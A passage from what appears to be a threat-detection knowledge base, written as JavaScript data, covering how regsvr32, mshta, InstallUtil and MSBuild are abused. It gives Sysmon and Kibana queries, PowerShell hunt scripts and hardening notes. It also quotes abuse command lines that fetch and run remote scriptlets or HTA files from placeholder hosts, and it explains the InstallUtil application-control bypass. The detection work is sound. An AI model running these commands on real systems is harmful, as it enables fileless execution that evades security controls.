+Squiblydoo is the textbook application-control bypass: a single
+signed binary (regsvr32) plus a signed runtime (scrobj.dll) fetch
+and execute a remote script with nothing written to disk. Its
+longevity comes from hitting four useful properties at once -
+trusted, network-capable, fileless, and policy-bypassing - which is
+why it remains a staple of loaders and red-team tradecraft.
+
+The defining detection (lead with it):
+  regsvr32.exe is not a network client. In normal operation it
+  registers and unregisters local COM DLLs; it has no business
+  opening an outbound socket. So a Sysmon EID 3 network connection
+  from regsvr32 is, on its own, a high-confidence Squiblydoo signal -
+  before you even parse the command line. Combine it with the
+  /i:http(s) argument and the scrobj.dll image load and the
+  confidence is very high.
+
+The command-line tells:
+  the /i:URL form is the remote variant; the /u /i pair (unregister
+  + install) is the trick that runs the scriptlet's Unregister code
+  without actually registering a component. Both, plus a .sct
+  reference or scrobj.dll, are the strings to alert on.
+
+The chain context:
+  Squiblydoo rarely stands alone. It is usually parented by a maldoc
+  process (Office, mshta, a script host) and it usually spawns a
+  shell or downloader as its child. Parent-and-child context turns a
+  medium-confidence command-line hit into a clear intrusion chain.
+
+Program placement:
+  the regsvr32-network rule is cheap, low-FP, and high-value - one of
+  the better single LOLBin detections to deploy early. Pair it with
+  WDAC/AppLocker and ASR to also raise the prevention bar.
+
+Threat actor use:
+  broadly used - Cobalt Strike and other C2 deliver via Squiblydoo,
+  and it appears across Chinese, criminal (FIN7), and commodity
+  loader operations as an application-control bypass.`,
+        ossdetect: `Sigma rules:
+- proc_creation_win_regsvr32_squiblydoo.yml (/i:http, scrobj, .sct)
+- net_connection_win_regsvr32_network_activity.yml
+- proc_creation_win_regsvr32_anomaly.yml (odd parent/child)
+- image_load_win_regsvr32_scrobj.yml
+
+Elastic detection rules:
+- Regsvr32 Network Activity (Squiblydoo)
+- Regsvr32 Scriptlet Execution via scrobj.dll
+- Suspicious Regsvr32 Parent/Child
+
+The lead detection (network):
+  Sysmon EID 3 from regsvr32.exe to a non-RFC1918 destination -
+  near-zero legitimate volume, deploy first.
+
+LOLBAS:
+  /lolbas/Binaries/Regsvr32/ - baseline + scriptlet abuse forms.
+
+Sysmon config:
+  EID 1 (command line + parent), 3 (network - the key one),
+  7 (scrobj.dll / script engine image load), 22 (DNS).
+
+Application control:
+  WDAC/AppLocker rules and ASR to constrain scrobj-based script
+  execution; modern Windows mitigates some variants natively.
+
+osquery:
+  SELECT pid,name,cmdline,parent FROM processes WHERE name='regsvr32.exe';
+  join process_open_sockets to find network-active regsvr32.
+
+Atomic Red Team:
+  T1218.010 - regsvr32 Squiblydoo (remote and local .sct) tests`,
+        notes: "Squiblydoo is the textbook application-control bypass: a single signed binary (regsvr32) plus a signed runtime (scrobj.dll) fetch and execute a remote COM scriptlet with nothing written to disk, via regsvr32 /s /n /u /i:http://host/payload.sct scrobj.dll. Its longevity comes from hitting four useful properties at once, being trusted, network-capable, fileless, and policy-bypassing, which is why it remains a staple of loaders and red-team tradecraft. The defining detection should lead: regsvr32.exe is not a network client, since in normal operation it registers and unregisters local COM DLLs and has no business opening an outbound socket, so a Sysmon EID 3 network connection from regsvr32 is on its own a high-confidence Squiblydoo signal before you even parse the command line, and combined with the /i:http argument and the scrobj.dll image load the confidence is very high. The command-line tells are the /i:URL remote form and the /u /i pair (unregister plus install) that runs the scriptlet's Unregister code without actually registering a component, both of which plus a .sct reference or scrobj.dll are the strings to alert on. Squiblydoo rarely stands alone: it is usually parented by a maldoc process such as Office, mshta, or a script host and usually spawns a shell or downloader as its child, so parent-and-child context turns a medium-confidence command-line hit into a clear intrusion chain. The regsvr32-network rule is cheap, low false-positive, and high-value, one of the better single LOLBin detections to deploy early, and it pairs with WDAC, AppLocker, and ASR to raise the prevention bar. The technique is broadly used, with Cobalt Strike and other C2 delivering via Squiblydoo and appearances across Chinese, criminal (FIN7), and commodity loader operations as an application-control bypass.",
+        apt: [
+          { cls: "apt-mul", name: "Cobalt Strike / C2 delivery", note: "Squiblydoo is a common application-control bypass for fetching and running fileless scriptlet stagers under a signed binary." },
+          { cls: "apt-cn", name: "China-nexus loaders", note: "Use regsvr32 remote scriptlet execution to bypass application control during initial execution." },
+          { cls: "apt-mul", name: "FIN7 / criminal crews", note: "Employ Squiblydoo in maldoc chains where Office spawns regsvr32 to pull a remote .sct downloader." }
+        ],
+        cite: "MITRE ATT&CK T1218.010"
+      }
+    ]
+  },
+  {
+    id: "T1218.005",
+    name: "System Binary Proxy Execution: Mshta",
+    desc: "Abusing mshta.exe to execute HTA files or inline VBScript and JScript, the workhorse of phishing maldoc chains. Detection is structural rather than content-based: Office rarely spawns mshta and mshta rarely spawns a shell, so the chain Office to mshta to PowerShell is a stack of anomalies, and either parent-child edge is high-value.",
+    rows: [
+      {
+        sub: "T1218.005 - Mshta: HTA and Inline Script Execution",
+        os: "win",
+        indicator: "Abusing mshta.exe, the Microsoft HTML Application host, to execute .hta files or inline VBScript/JScript, including remote payloads (mshta http://host/evil.hta) and the vbscript:Execute / javascript: inline forms, running script under a signed binary and bypassing browser and script-host controls; a hallmark of phishing maldoc chains",
+        sysmon: `// Process create (Sysmon EID 1) - mshta abuse
+Image=*\\mshta.exe CommandLine=(
+  *http* OR *https* OR *.hta*           // remote or dropped HTA
+  OR *vbscript:* OR *javascript:*       // inline script
+  OR *Execute(* OR *CreateObject* OR *GetObject* OR *RunHTMLApplication*)
+// THE classic phishing chain: Office/Outlook -> mshta
+ParentImage=(*\\winword.exe OR *\\excel.exe OR *\\powerpnt.exe OR *\\outlook.exe)
+  AND Image=*\\mshta.exe
+// mshta spawning a shell or LOLBin (the second stage)
+ParentImage=*\\mshta.exe AND Image=(*\\powershell.exe OR *\\cmd.exe
+  OR *\\wscript.exe OR *\\cscript.exe OR *\\rundll32.exe OR *\\regsvr32.exe)
+
+// Network (EID 3): mshta fetching a remote .hta / stage
+// DNS (EID 22): mshta resolving an external host
+// Image load (EID 7): mshtml/jscript/vbscript into mshta
+// File create (EID 11): a dropped .hta in Temp/AppData`,
+        kibana: `// mshta with URL / HTA / inline script
+process.name: "mshta.exe" AND process.command_line: (
+  *http* OR *.hta* OR *vbscript\\:* OR *javascript\\:* OR *Execute(* OR *CreateObject*)
+
+// Office/Outlook -> mshta (phishing chain)
+process.name: "mshta.exe"
+AND process.parent.name: ("winword.exe" OR "excel.exe" OR "powerpnt.exe" OR "outlook.exe")
+
+// mshta -> shell/LOLBin (second stage)
+process.parent.name: "mshta.exe"
+AND process.name: ("powershell.exe" OR "cmd.exe" OR "wscript.exe"
+  OR "rundll32.exe" OR "regsvr32.exe")
+
+// mshta network egress (Sysmon 3)
+winlog.event_id: 3 AND process.name: "mshta.exe"
+AND NOT destination.ip: (10.0.0.0/8 OR 172.16.0.0/12 OR 192.168.0.0/16)`,
+        powershell: `# T1218.005 - Mshta abuse hunt
+# Strongest chains: Office -> mshta (phishing) and mshta -> shell
+# (second stage). Plus mshta with a URL / inline script.
+
+$sysmon='Microsoft-Windows-Sysmon/Operational'
+
+Write-Host "[*] === mshta command lines with URL / HTA / inline script ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'mshta\\.exe' -and $_.Message -match 'http|\\.hta|vbscript:|javascript:|Execute\\(|CreateObject' } |
+  ForEach-Object {
+    $cl=([regex]::Match($_.Message,'CommandLine: (.+)')).Groups[1].Value
+    $pp=([regex]::Match($_.Message,'ParentImage: (.+)')).Groups[1].Value
+    [pscustomobject]@{Time=$_.TimeCreated; Parent=(Split-Path $pp -Leaf); Cmd=$cl}
+  } | Format-Table -Auto -Wrap
+
+Write-Host "[*] === phishing chain: Office/Outlook -> mshta ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'ParentImage:.*(winword|excel|powerpnt|outlook)' -and $_.Message -match 'Image:.*mshta\\.exe' } |
+  Select-Object TimeCreated, @{n='Parent';e={(Split-Path ([regex]::Match($_.Message,'ParentImage: (.+)')).Groups[1].Value -Leaf)}} -First 20 | Format-Table -Auto
+
+Write-Host "[*] === second stage: mshta -> shell/LOLBin ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'ParentImage:.*mshta\\.exe' -and $_.Message -match 'Image:.*(powershell|cmd|wscript|cscript|rundll32|regsvr32)\\.exe' } |
+  Select-Object TimeCreated, @{n='Child';e={(Split-Path ([regex]::Match($_.Message,'Image: (.+)')).Groups[1].Value -Leaf)}} -First 20 | Format-Table -Auto
+
+Write-Host "[*] === dropped .hta files in user-writable paths ==="
+Get-ChildItem 'C:\\Users\\*\\AppData\\*','C:\\Windows\\Temp','C:\\ProgramData' -Filter *.hta -Recurse -ErrorAction SilentlyContinue |
+  Select-Object FullName, LastWriteTime -First 15 | Format-Table -Auto`,
+        registry: `Mshta abuse artifacts:
+
+The binary:
+  C:\\Windows\\System32\\mshta.exe
+  C:\\Windows\\SysWOW64\\mshta.exe
+
+Invocation forms:
+  mshta http://host/evil.hta            remote HTA (fetched + run)
+  mshta C:\\Users\\...\\AppData\\evil.hta  dropped local HTA
+  mshta vbscript:Execute("...")(window.close)   inline VBScript
+  mshta javascript:...                  inline JScript
+  HTAs commonly CreateObject("WScript.Shell") and Run a PowerShell
+  or downloader command - mshta is the launcher, not the payload.
+
+File association + persistence:
+  HKCR\\htafile\\Shell\\Open\\Command -> mshta.exe "%1"
+  Run-key / scheduled-task persistence frequently invokes mshta with
+  an .hta path or URL (cross-ref persistence T1547.001 / T1053.005).
+  WININET cache may hold a fetched remote .hta.
+
+The phishing chain (the signature pattern):
+  a maldoc opens -> Office/Outlook spawns mshta -> mshta runs the
+  HTA -> the HTA spawns powershell/cmd or a downloader. Both ends of
+  that chain are anomalous: Office rarely spawns mshta, and mshta
+  rarely spawns a shell. Detecting either parent->child edge is
+  high-value; detecting both is near-certain.
+
+High-signal indicators:
+  Office/Outlook -> mshta (parent->child)
+  mshta -> powershell/cmd/wscript/rundll32/regsvr32 (parent->child)
+  mshta command line with a URL, .hta, or vbscript:/javascript:
+  mshta making outbound network connections (remote HTA fetch)
+  a dropped .hta in Temp/AppData
+
+Hardening:
+  block or remove the .hta handler where business need allows;
+  ASR rules (block executable content from email/webmail, block
+  Office child-process creation) break the common mshta phishing
+  chain; application control can deny mshta outright in many fleets.
+
+Reference:
+  LOLBAS /lolbas/Binaries/Mshta/ documents the abuse forms.`,
+        tools: `Mshta as a script launcher:
+
+Mshta exists to run HTML Applications - HTML plus script with full
+local privileges - so it is a ready-made signed launcher for
+VBScript and JScript. It is the workhorse of phishing maldoc chains
+precisely because it bridges a document into arbitrary script under
+a trusted process.
+
+The two parent-child edges that define the detection:
+  Office rarely, if ever, legitimately spawns mshta, and mshta rarely
+  legitimately spawns a command shell. So the chain
+  winword/excel/outlook -> mshta -> powershell/cmd is a stack of
+  anomalies. You do not need to decode the HTA: catching either edge
+  is strong, and catching the full chain is about as close to
+  certain as host detection gets. This makes mshta one of the more
+  satisfying LOLBins to hunt - the behavior is structurally weird.
+
+The command-line and network tells:
+  a URL or .hta on the mshta command line, or an inline vbscript:/
+  javascript: payload, plus mshta reaching out to fetch a remote
+  HTA. mshta network egress is itself unusual enough to corroborate.
+
+Prevention is unusually achievable here:
+  unlike rundll32 (which the OS needs constantly), mshta has a narrow
+  legitimate footprint in most enterprises. ASR rules that block
+  Office child processes and block executable content from email
+  sever the common chain, and many fleets can application-control
+  mshta off entirely. Where business need forbids removal, the
+  parent-child detection is the fallback.
+
+OT/ICS relevance:
+  HMIs and engineering workstations almost never have a legitimate
+  use for mshta, so denying or alerting on it there is low-risk and
+  high-value.
+
+Threat actor use:
+  extremely common in phishing-led intrusions: Iranian (MuddyWater)
+  and North Korean (Lazarus, Kimsuky) sets, APT32, the Kovter family,
+  and many ransomware precursors use mshta to launch second-stage
+  PowerShell from a document.`,
+        ossdetect: `Sigma rules:
+- proc_creation_win_mshta_susp_command_line.yml (url/hta/inline)
+- proc_creation_win_office_spawn_mshta.yml
+- proc_creation_win_mshta_spawn_shell.yml
+- net_connection_win_mshta_network.yml
+
+Elastic detection rules:
+- Mshta Executing Remote or Inline Script
+- Office Application Spawning Mshta
+- Mshta Spawning Command Shell
+
+The two high-value edges:
+  parent winword/excel/outlook -> child mshta
+  parent mshta -> child powershell/cmd/wscript/rundll32/regsvr32
+  alert on either; both together is near-certain.
+
+LOLBAS:
+  /lolbas/Binaries/Mshta/ - abuse forms and baseline.
+
+Sysmon config:
+  EID 1 (command line + parent/child), 3 (network for remote HTA),
+  7 (mshtml/script image load), 11 (.hta drop), 22 (DNS).
+
+Prevention (ASR / app control):
+  ASR "block Office child processes" and "block executable content
+  from email client and webmail" break the chain; application
+  control can deny mshta where there is no business need.
+
+osquery:
+  SELECT pid,name,cmdline,parent FROM processes WHERE name='mshta.exe';
+
+Atomic Red Team:
+  T1218.005 - mshta remote HTA and inline script tests`,
+        notes: "Mshta exists to run HTML Applications, which are HTML plus script with full local privileges, so it is a ready-made signed launcher for VBScript and JScript and the workhorse of phishing maldoc chains because it bridges a document into arbitrary script under a trusted process. Two parent-child edges define the detection: Office rarely if ever legitimately spawns mshta, and mshta rarely legitimately spawns a command shell, so the chain winword, excel, or outlook to mshta to powershell or cmd is a stack of anomalies. You do not need to decode the HTA, because catching either edge is strong and catching the full chain is about as close to certain as host detection gets, which makes mshta one of the more satisfying LOLBins to hunt since the behavior is structurally weird. The command-line and network tells are a URL or .hta on the mshta command line or an inline vbscript: or javascript: payload, plus mshta reaching out to fetch a remote HTA, and mshta network egress is itself unusual enough to corroborate. Prevention is unusually achievable here because, unlike rundll32 which the OS needs constantly, mshta has a narrow legitimate footprint in most enterprises, so ASR rules that block Office child processes and block executable content from email sever the common chain and many fleets can application-control mshta off entirely, with the parent-child detection as the fallback where business need forbids removal. On HMIs and engineering workstations there is almost never a legitimate use for mshta, so denying or alerting on it there is low-risk and high-value. The technique is extremely common in phishing-led intrusions, used by Iranian MuddyWater and North Korean Lazarus and Kimsuky sets, APT32, the Kovter family, and many ransomware precursors to launch second-stage PowerShell from a document.",
+        apt: [
+          { cls: "apt-ir", name: "MuddyWater", note: "Heavy use of mshta to execute HTA-borne scripts that launch PowerShell second stages in phishing-led intrusions." },
+          { cls: "apt-kp", name: "Lazarus / Kimsuky", note: "Use mshta from maldoc chains to run inline or remote scripts under a signed binary." },
+          { cls: "apt-mul", name: "Kovter / ransomware precursors", note: "mshta launches second-stage payloads from documents, a recurring commodity and pre-ransomware execution pattern." }
+        ],
+        cite: "MITRE ATT&CK T1218.005"
+      }
+    ]
+  },
+  {
+    id: "T1218.004",
+    name: "System Binary Proxy Execution: InstallUtil",
+    desc: "Abusing the .NET InstallUtil.exe to run code via the Uninstall method of a crafted assembly (InstallUtil /U /LogToConsole=false evil.exe), executing managed payloads under a signed framework binary that application control trusts by path. The fingerprint is the /U plus suppressed-logging argument against a user-path assembly with a non-developer parent.",
+    rows: [
+      {
+        sub: "T1218.004 - InstallUtil: .NET Uninstall-Method Proxy Execution",
+        os: "win",
+        indicator: "Abusing the .NET Framework InstallUtil.exe to run code through the [System.ComponentModel.RunInstaller] Uninstall method of a crafted assembly (InstallUtil /logfile= /LogToConsole=false /U evil.exe), executing attacker code under a signed Microsoft utility and bypassing application control that trusts the .NET tooling path",
+        sysmon: `// Process create (Sysmon EID 1) - InstallUtil abuse
+Image=*\\InstallUtil.exe CommandLine=(
+  *\\/U* OR *\\/uninstall*           // the uninstall-method trick
+  OR *LogToConsole=false* OR *\\/logfile=* )
+  AND CommandLine=(*\\Temp\\* OR *\\AppData\\* OR *\\Public\\* OR *\\Downloads\\*
+    OR *\\ProgramData\\*)            // assembly from a user path
+// InstallUtil with a non-dev parent or spawning children
+ParentImage=(*\\winword.exe OR *\\powershell.exe OR *\\cmd.exe OR *\\mshta.exe)
+  AND Image=*\\InstallUtil.exe
+ParentImage=*\\InstallUtil.exe AND Image=(*\\cmd.exe OR *\\powershell.exe)
+
+// Network (EID 3): InstallUtil making outbound connections (the
+//   loaded assembly beaconing) - unusual for a build-time utility
+// Image load (EID 7): the crafted .NET assembly + clr.dll into InstallUtil
+// InstallUtil paths (both frameworks/architectures):
+//   C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe
+//   C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe`,
+        kibana: `// InstallUtil uninstall-method execution of a user-path assembly
+process.name: "InstallUtil.exe" AND (
+  process.command_line: (*"/U"* OR *"/uninstall"* OR *LogToConsole=false*)
+  AND process.command_line: (*\\\\Temp\\\\* OR *\\\\AppData\\\\* OR *\\\\Public\\\\*
+    OR *\\\\Downloads\\\\* OR *\\\\ProgramData\\\\*))
+
+// InstallUtil with a non-developer parent (build tools do not run
+// from Office/script hosts)
+process.name: "InstallUtil.exe"
+AND process.parent.name: ("winword.exe" OR "excel.exe" OR "powershell.exe"
+  OR "cmd.exe" OR "mshta.exe" OR "wscript.exe")
+
+// InstallUtil spawning a shell or making network connections
+(process.parent.name: "InstallUtil.exe" AND process.name: ("cmd.exe" OR "powershell.exe"))
+OR (winlog.event_id: 3 AND process.name: "InstallUtil.exe"
+  AND NOT destination.ip: (10.0.0.0/8 OR 172.16.0.0/12 OR 192.168.0.0/16))`,
+        powershell: `# T1218.004 - InstallUtil proxy execution hunt
+# The tell: InstallUtil (a build-time tool) invoked with /U against
+# an assembly in a user path, outside any real build/deploy context.
+
+$sysmon='Microsoft-Windows-Sysmon/Operational'
+
+Write-Host "[*] === InstallUtil /U against user-path assemblies ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'InstallUtil\\.exe' -and $_.Message -match '/U\\b|/uninstall|LogToConsole=false' } |
+  ForEach-Object {
+    $cl=([regex]::Match($_.Message,'CommandLine: (.+)')).Groups[1].Value
+    $pp=([regex]::Match($_.Message,'ParentImage: (.+)')).Groups[1].Value
+    $flag = if($cl -match 'Temp\\\\|AppData\\\\|Public\\\\|Downloads\\\\|ProgramData\\\\'){'user-path-assembly'}else{'review-context'}
+    [pscustomobject]@{Time=$_.TimeCreated; Flag=$flag; Parent=(Split-Path $pp -Leaf); Cmd=$cl}
+  } | Format-Table -Auto -Wrap
+
+Write-Host "[*] === InstallUtil with non-dev parent or spawning a shell ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { ($_.Message -match 'ParentImage:.*(winword|excel|powershell|cmd|mshta|wscript)' -and $_.Message -match 'Image:.*InstallUtil') -or ($_.Message -match 'ParentImage:.*InstallUtil' -and $_.Message -match 'Image:.*(cmd|powershell)\\.exe') } |
+  Select-Object TimeCreated, @{n='Chain';e={(Split-Path ([regex]::Match($_.Message,'ParentImage: (.+)')).Groups[1].Value -Leaf)+' -> '+(Split-Path ([regex]::Match($_.Message,'Image: (.+)')).Groups[1].Value -Leaf)}} -First 20 | Format-Table -Auto
+
+Write-Host "[*] === InstallUtil network connections (loaded assembly beaconing) ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=3} -MaxEvents 1000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'InstallUtil\\.exe' } |
+  Select-Object TimeCreated, @{n='Dest';e={([regex]::Match($_.Message,'DestinationIp: (.+)')).Groups[1].Value}} -First 15 | Format-Table -Auto`,
+        registry: `InstallUtil proxy execution artifacts:
+
+The binary (per .NET version + architecture, present on most hosts):
+  C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe
+  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe
+  (also v2.0.50727 on older systems)
+
+The abuse:
+  a crafted .NET assembly implements a class marked
+  [System.ComponentModel.RunInstaller(true)] whose Uninstall (or
+  Install) method contains the malicious code. Running:
+    InstallUtil /logfile= /LogToConsole=false /U evil.exe
+  invokes that method - so InstallUtil, a signed Microsoft build/
+  deploy utility, executes the attacker's code. The /U (uninstall)
+  path is favored because it runs even on an unregistered assembly.
+
+Why it bypasses controls:
+  application-control policies frequently trust the .NET framework
+  directory and its tooling. InstallUtil living there, signed by
+  Microsoft, sails through path/publisher allow-lists, and the
+  malicious logic rides inside an otherwise ordinary .NET assembly.
+
+High-signal indicators:
+  InstallUtil invoked with /U (or /uninstall) and LogToConsole=false
+  the target assembly residing in Temp/AppData/Public/Downloads
+  InstallUtil parented by Office, a script host, or a shell (build
+    tools do not launch from those)
+  InstallUtil spawning cmd/powershell, or making network connections
+  the loaded assembly (EID 7) being unsigned / from a user path
+
+Context / baseline:
+  legitimate InstallUtil use is tied to software install/uninstall
+  and developer workflows, from installer or admin contexts and
+  trusted program directories - NOT from user temp folders with
+  /LogToConsole=false. That argument-plus-path combination is the
+  discriminator.
+
+Reference:
+  LOLBAS /lolbas/Binaries/Installutil/ documents the technique.`,
+        tools: `InstallUtil as a proxy executor:
+
+InstallUtil is a .NET Framework command-line tool for running the
+installer components of an assembly. Its abuse is elegant: mark a
+class as an installer, put the payload in the Uninstall method, and
+let InstallUtil - signed by Microsoft and living in the trusted .NET
+directory - execute it. Application control that trusts the framework
+path is bypassed, and no separate compiler or loader is needed.
+
+The discriminator (argument plus path plus context):
+  the legitimate tool runs during software install/uninstall and dev
+  builds, from admin/installer contexts and program directories. The
+  abuse runs it with /U and /LogToConsole=false against an assembly
+  sitting in a user temp folder, often parented by a maldoc or shell.
+  None of those properties is individually unique, but the
+  combination - uninstall verb + suppressed logging + user-path
+  assembly + non-dev parent - is a clean signal.
+
+Corroborators:
+  InstallUtil is a build-time utility; it has little reason to spawn
+  a command shell or to open an outbound socket. A child cmd/
+  powershell, or network egress (the loaded assembly beaconing),
+  raises a borderline command-line hit to high confidence.
+
+Program placement:
+  InstallUtil sits in the family of .NET/dev-tool LOLBins (with
+  MSBuild, RegAsm/RegSvcs) that all bypass application control by
+  executing managed code through a trusted utility. A single rule
+  pattern - "trusted .NET tool running managed code from a user path
+  with a non-dev parent" - covers much of this family; InstallUtil's
+  /U + LogToConsole=false is its specific fingerprint.
+
+OT/ICS relevance:
+  engineering workstations may legitimately have the .NET framework
+  but rarely run InstallUtil interactively from temp folders, so the
+  abuse pattern stands out well against an OT baseline.
+
+Threat actor use:
+  a staple of red-team and APT application-control bypass; used by
+  espionage sets and criminal operators to launch managed payloads
+  (including .NET implants and Cobalt Strike loaders) under a signed
+  framework binary.`,
+        ossdetect: `Sigma rules:
+- proc_creation_win_installutil_uninstall_method.yml (/U + LogToConsole=false)
+- proc_creation_win_installutil_susp_path_assembly.yml
+- proc_creation_win_installutil_nondev_parent.yml
+
+Elastic detection rules:
+- InstallUtil Uninstall Method Execution
+- InstallUtil Running Assembly from Temp
+- Trusted .NET Utility Spawned by Non-Developer Process
+
+Detection pattern (covers the .NET-tool LOLBin family):
+  a trusted .NET utility (InstallUtil/MSBuild/RegAsm/RegSvcs)
+  executing managed code from a user path with a non-dev parent;
+  InstallUtil's specific fingerprint is /U + /LogToConsole=false.
+
+LOLBAS:
+  /lolbas/Binaries/Installutil/ - abuse forms and baseline.
+
+Sysmon config:
+  EID 1 (command line + parent), 7 (assembly + clr image load),
+  3 (network for managed-payload beacon).
+
+Application control:
+  WDAC with managed-code rules; ASR; do not blanket-trust the .NET
+  framework directory in allow-lists - constrain InstallUtil where
+  there is no developer/admin need.
+
+osquery:
+  SELECT pid,name,cmdline,parent FROM processes WHERE name='InstallUtil.exe';
+
+Atomic Red Team:
+  T1218.004 - InstallUtil uninstall-method execution tests`,
+        notes: "InstallUtil is a .NET Framework command-line tool for running the installer components of an assembly, and its abuse is elegant: mark a class as an installer, put the payload in the Uninstall method, and let InstallUtil, signed by Microsoft and living in the trusted .NET directory, execute it via InstallUtil /logfile= /LogToConsole=false /U evil.exe, so application control that trusts the framework path is bypassed and no separate compiler or loader is needed. The /U uninstall path is favored because it runs even on an unregistered assembly. The discriminator is the combination of argument, path, and context: the legitimate tool runs during software install and uninstall and developer builds from admin or installer contexts and program directories, whereas the abuse runs it with /U and /LogToConsole=false against an assembly sitting in a user temp folder, often parented by a maldoc or shell, and while none of those properties is individually unique, the combination of uninstall verb plus suppressed logging plus user-path assembly plus non-dev parent is a clean signal. Corroborators help because InstallUtil is a build-time utility with little reason to spawn a command shell or open an outbound socket, so a child cmd or powershell, or network egress from the loaded assembly beaconing, raises a borderline command-line hit to high confidence. InstallUtil sits in the family of .NET and dev-tool LOLBins alongside MSBuild and RegAsm/RegSvcs that all bypass application control by executing managed code through a trusted utility, so a single rule pattern of a trusted .NET tool running managed code from a user path with a non-dev parent covers much of the family, with InstallUtil's /U plus LogToConsole=false as its specific fingerprint. On engineering workstations the .NET framework may be present but InstallUtil is rarely run interactively from temp folders, so the abuse pattern stands out well against an OT baseline. It is a staple of red-team and APT application-control bypass, used by espionage sets and criminal operators to launch managed payloads including .NET implants and Cobalt Strike loaders under a signed framework binary.",
+        apt: [
+          { cls: "apt-mul", name: "Red-team / app-control bypass", note: "InstallUtil /U uninstall-method execution is a standard way to run managed payloads past application control that trusts the .NET directory." },
+          { cls: "apt-kp", name: "Lazarus", note: "Uses trusted .NET utilities to execute managed loaders under a signed framework binary." },
+          { cls: "apt-mul", name: "Cobalt Strike loaders", note: "Managed loaders launched via InstallUtil to proxy execution through a Microsoft-signed build tool." }
+        ],
+        cite: "MITRE ATT&CK T1218.004"
+      }
+    ]
+  },
+  {
+    id: "T1127.001",
+    name: "Trusted Developer Utilities: MSBuild",
+    desc: "Abusing MSBuild.exe to compile and execute inline C# embedded in a crafted project file, bypassing application control as a signed developer tool and defeating static detection by shipping the payload as source compiled only at runtime. Because MSBuild runs legitimately on developer and build hosts, detection keys on context: a project from a user path, a non-developer parent, and child shells or network egress.",
+    rows: [
+      {
+        sub: "T1127.001 - MSBuild: Inline Task Source Execution",
+        os: "win",
+        indicator: "Abusing MSBuild.exe, a trusted developer build tool, to compile and execute inline C# embedded in a crafted .csproj or .xml project file via an inline UsingTask/Code block, running arbitrary code under a signed Microsoft binary and performing on-host compilation without a separate compiler, which both bypasses application control and evades static detection of the payload",
+        sysmon: `// Process create (Sysmon EID 1) - MSBuild abuse
+Image=*\\MSBuild.exe CommandLine=(
+  *\\Temp\\* OR *\\AppData\\* OR *\\Public\\* OR *\\Downloads\\* OR *\\ProgramData\\*
+  OR *.csproj* OR *.xml* OR *.proj*)        // project from a user path
+// MSBuild with a NON-developer parent (the key anomaly)
+ParentImage=(*\\winword.exe OR *\\excel.exe OR *\\outlook.exe OR *\\mshta.exe
+  OR *\\powershell.exe OR *\\cmd.exe OR *\\wscript.exe)
+  AND Image=*\\MSBuild.exe
+// MSBuild spawning a shell / making network connections
+ParentImage=*\\MSBuild.exe AND Image=(*\\cmd.exe OR *\\powershell.exe OR *\\rundll32.exe)
+
+// Image load (EID 7): csc.exe / Roslyn / clr loaded by MSBuild at
+//   runtime indicates on-the-fly compilation of inline source
+// Network (EID 3): MSBuild making outbound connections (compiled
+//   inline payload beaconing) - abnormal outside CI
+// File create (EID 11): transient compiled artifacts in Temp
+// MSBuild paths:
+//   C:\\Windows\\Microsoft.NET\\Framework[64]\\v4.0.30319\\MSBuild.exe
+//   C:\\Program Files*\\...\\MSBuild\\...\\Bin\\MSBuild.exe (VS)`,
+        kibana: `// MSBuild running a project from a user path
+process.name: "MSBuild.exe"
+AND process.command_line: (*\\\\Temp\\\\* OR *\\\\AppData\\\\* OR *\\\\Public\\\\*
+  OR *\\\\Downloads\\\\* OR *\\\\ProgramData\\\\* OR *.csproj* OR *.xml*)
+
+// MSBuild with a non-developer parent (build tools come from dev IDEs
+// and CI agents, not Office/script hosts)
+process.name: "MSBuild.exe"
+AND process.parent.name: ("winword.exe" OR "excel.exe" OR "outlook.exe"
+  OR "mshta.exe" OR "powershell.exe" OR "cmd.exe" OR "wscript.exe")
+
+// MSBuild spawning a shell or making network connections
+(process.parent.name: "MSBuild.exe" AND process.name: ("cmd.exe" OR "powershell.exe" OR "rundll32.exe"))
+OR (winlog.event_id: 3 AND process.name: "MSBuild.exe"
+  AND NOT destination.ip: (10.0.0.0/8 OR 172.16.0.0/12 OR 192.168.0.0/16))
+
+// runtime compilation tell: csc.exe loaded/spawned by MSBuild (Sysmon 7/1)
+winlog.event_id: 7 AND process.name: "MSBuild.exe" AND file.name: ("csc.exe" OR "*Roslyn*")`,
+        powershell: `# T1127.001 - MSBuild inline-task execution hunt
+# The discriminator is CONTEXT: MSBuild belongs to dev IDEs and CI
+# agents. MSBuild from a user path, with a non-dev parent, or
+# spawning shells/network is the abuse signature.
+
+$sysmon='Microsoft-Windows-Sysmon/Operational'
+
+Write-Host "[*] === MSBuild running projects from user paths / non-dev parents ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'MSBuild\\.exe' } |
+  ForEach-Object {
+    $cl=([regex]::Match($_.Message,'CommandLine: (.+)')).Groups[1].Value
+    $pp=([regex]::Match($_.Message,'ParentImage: (.+)')).Groups[1].Value
+    $flag=@()
+    if($cl -match 'Temp\\\\|AppData\\\\|Public\\\\|Downloads\\\\|ProgramData\\\\'){ $flag+='user-path-project' }
+    if($pp -match 'winword|excel|outlook|mshta|powershell|cmd|wscript'){ $flag+='non-dev-parent' }
+    if($flag){ [pscustomobject]@{Time=$_.TimeCreated; Flags=($flag -join ','); Parent=(Split-Path $pp -Leaf); Cmd=$cl} }
